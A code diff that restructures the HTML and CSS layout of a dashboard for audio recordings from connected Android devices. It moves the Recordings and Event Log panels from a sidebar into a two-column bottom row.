@@ -44,10 +44,10 @@
       .conn-dot.connected { background: var(--green); box-shadow: 0 0 8px rgba(34,197,94,.7); animation: pulse 2s infinite; }
       @keyframes pulse { 0%,100%{box-shadow:0 0 6px rgba(34,197,94,.6)} 50%{box-shadow:0 0 14px rgba(34,197,94,.9)} }
 
-      /* Grid */
-      .main-grid { display: grid; grid-template-columns: 1fr 320px; gap: 16px; align-items: start; }
-      @media(max-width:900px){ .main-grid{ grid-template-columns:1fr; } }
+      /* Layout */
       .section-label { font-size: 11px; font-weight: 600; letter-spacing: .08em; text-transform: uppercase; color: var(--text3); margin-bottom: 10px; }
+      .bottom-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 16px; }
+      @media(max-width:700px){ .bottom-row{ grid-template-columns:1fr; } }
 
       /* Devices */
       #devicesContainer { display: flex; flex-direction: column; gap: 14px; }
@@ -145,34 +145,30 @@
       </div>
     </div>
 
-    <div class="main-grid">
-      <div>
-        <div class="section-label">Connected Devices</div>
-        <div id="devicesContainer">
-          <div id="noDevices">
-            <span class="nd-icon">📵</span>
-            No devices connected yet.<br />
-            Install the APK and grant microphone permission.
-          </div>
+    <div class="section-label">Connected Devices</div>
+    <div id="devicesContainer">
+      <div id="noDevices">
+        <span class="nd-icon">📵</span>
+        No devices connected yet.<br />
+        Install the APK and grant microphone permission.
+      </div>
+    </div>
+
+    <div class="bottom-row">
+      <div class="panel">
+        <div class="panel-head">
+          <div class="panel-title"><span class="pi">📂</span> Recordings</div>
+        </div>
+        <div class="panel-body">
+          <div id="globalRecList"><div class="rec-empty">No recordings yet.</div></div>
         </div>
       </div>
-
-      <div class="sidebar">
-        <div class="panel">
-          <div class="panel-head">
-            <div class="panel-title"><span class="pi">📂</span> Recordings</div>
-          </div>
-          <div class="panel-body">
-            <div id="globalRecList"><div class="rec-empty">No recordings yet.</div></div>
-          </div>
+      <div class="panel">
+        <div class="panel-head">
+          <div class="panel-title"><span class="pi">📋</span> Event Log</div>
         </div>
-        <div class="panel">
-          <div class="panel-head">
-            <div class="panel-title"><span class="pi">📋</span> Event Log</div>
-          </div>
-          <div class="panel-body" style="padding-top:8px">
-            <div id="logOutput"></div>
-          </div>
+        <div class="panel-body" style="padding-top:8px">
+          <div id="logOutput"></div>
         </div>
       </div>
     </div>
